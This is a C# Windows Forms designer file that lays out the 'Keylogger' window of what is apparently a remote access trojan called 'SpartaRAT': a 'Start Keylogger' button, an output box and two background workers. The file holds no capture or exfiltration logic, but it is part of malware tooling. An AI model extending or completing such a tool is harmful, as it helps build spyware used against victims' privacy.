namespace WindowsFormsApp23
{
    partial class Keylogger
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.output = new System.Windows.Forms.TextBox();
            this.backgroundWorker1 = new System.ComponentModel.BackgroundWorker();
            this.backgroundWorker2 = new System.ComponentModel.BackgroundWorker();
            this.startKeylogger = new System.Windows.Forms.Button();
            this.SuspendLayout();
            // 
            // output
            // 
            this.output.BackColor = System.Drawing.SystemColors.Info;
            this.output.Location = new System.Drawing.Point(29, 13);
            this.output.Multiline = true;
            this.output.Name = "output";
            this.output.Size = new System.Drawing.Size(275, 259);
            this.output.TabIndex = 9;
            this.output.TextChanged += new System.EventHandler(this.output_TextChanged);
            // 
            // backgroundWorker1
            // 
            this.backgroundWorker1.DoWork += new System.ComponentModel.DoWorkEventHandler(this.backgroundWorker1_DoWork);
            // 
            // backgroundWorker2
            // 
            this.backgroundWorker2.DoWork += new System.ComponentModel.DoWorkEventHandler(this.backgroundWorker2_DoWork);
            // 
            // startKeylogger
            // 
            this.startKeylogger.BackColor = System.Drawing.SystemColors.AppWorkspace;
            this.startKeylogger.ForeColor = System.Drawing.Color.Red;
            this.startKeylogger.Location = new System.Drawing.Point(332, 25);
            this.startKeylogger.Name = "startKeylogger";
            this.startKeylogger.Size = new System.Drawing.Size(170, 65);
            this.startKeylogger.TabIndex = 8;
            this.startKeylogger.Text = "Start Keylogger";
            this.startKeylogger.UseVisualStyleBackColor = false;
            this.startKeylogger.Click += new System.EventHandler(this.button1_Click);
            // 
            // Keylogger
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.SystemColors.ButtonHighlight;
            this.ClientSize = new System.Drawing.Size(528, 284);
            this.Controls.Add(this.output);
            this.Controls.Add(this.startKeylogger);
            this.Name = "Keylogger";
            this.Text = "SpartaRAT | Keylogger";
            this.Load += new System.EventHandler(this.Keylogger_Load);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Button startKeylogger;
        private System.Windows.Forms.TextBox output;
        private System.ComponentModel.BackgroundWorker backgroundWorker1;
        private System.ComponentModel.BackgroundWorker backgroundWorker2;
    }
}